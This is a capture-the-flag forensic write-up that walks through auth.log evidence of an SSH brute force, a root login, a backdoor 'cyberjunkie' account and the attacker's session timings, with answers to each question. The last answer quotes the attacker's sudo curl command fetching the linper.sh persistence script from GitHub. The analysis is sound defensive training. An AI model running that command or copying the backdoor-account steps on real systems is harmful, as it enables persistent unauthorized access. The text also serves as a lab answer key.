# **Brutus Writeup**

In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

This is a relatively easy one to solve we are given a auth file and a wtmp file. This is what we will use to investigate and analysis

**Tools:**
- Text Editor

**Learned:**
- Log analysis of authentication file

### **Question 1**
Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?

As it says in the question... open up that auth log to idenify the IP address. Since it is a brute force I am going to look for consecutive attemps to login to a specific account. This would be the best attempt in identifying the attacker. I found in the log of the TA trying different accounts such as admin, root and other accounts to log in. I want to note how to read an authentication file output. The first IP is the server they tried to connect to and if you keep reading to the right you will see the account they tried logging into and it then logs the TA IP address out
	
![image](https://github.com/user-attachments/assets/09481aea-8646-4928-b31c-a27da62399ec)

**Answer:** 65.2.161.68
### **Question 2**
The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?

In the auth log, I am going to search for passwords that were accepted for accounts that have elevated permissions as this will indicate successful logins and I will ensure the source IP is the TA. I found a log where the TA logged in for the first time over an uncommon port 53814 with the root account over SSH protocol.

![image](https://github.com/user-attachments/assets/1ae69d6b-6177-42fb-996c-1ab5812395fd)

**Answer:** root
### **Question 3**
Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?

Looking at the successful login you can see the timestamp.

![image](https://github.com/user-attachments/assets/c33196a6-5841-4392-8263-6bb721c1a493)

**Answer:** 2024-03-06 06:32:45
### **Question 4**
SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

Follow the logs shortly after the successful login of the root account you can see in the logs of ID of the new session

![image](https://github.com/user-attachments/assets/33ac11da-4ea0-4b9d-a4c3-26521784d867)

**Answer:** 37
### **Question 5**
The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

Continue to follow the logs after the session ID you can identify the new user account added. They did it through the shell.

![image](https://github.com/user-attachments/assets/5ab3ac21-785f-46d8-8c16-1fb4c12fe2bb)

**Answer:** cyberjunkie
### **Question 6**
What is the MITRE ATT&CK sub-technique ID used for persistence?

Following this on MITRE ATT&CK we can identify what they used for persistance which is creating a local account: https://attack.mitre.org/techniques/T1136/001/

**Answer:** T1136.001
### **Question 7**
How long did the attacker's first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)

This is an easy one! Look at the timestamp of when the user logged in using that session ID. The session ID is a great way to track specific accounts login/logouts.  Reading the logs I found when the session was closed for the 'root' account.

![image](https://github.com/user-attachments/assets/40aa87f6-cfdf-4cf0-a161-6b8b3b1762a3)

**Answer:** 279
### **Question 8**
The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

Continue to follow the logs you will see a log of when the creds for 'cyberjunkie' were acceptd and a new session was opened with an ID of '49'. Continue following those you will see a cur command of them getting a linper.sh file from github
	
![image](https://github.com/user-attachments/assets/70dadc5a-4da5-41fb-b819-4a05fe9daad2)

**Answer:**/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

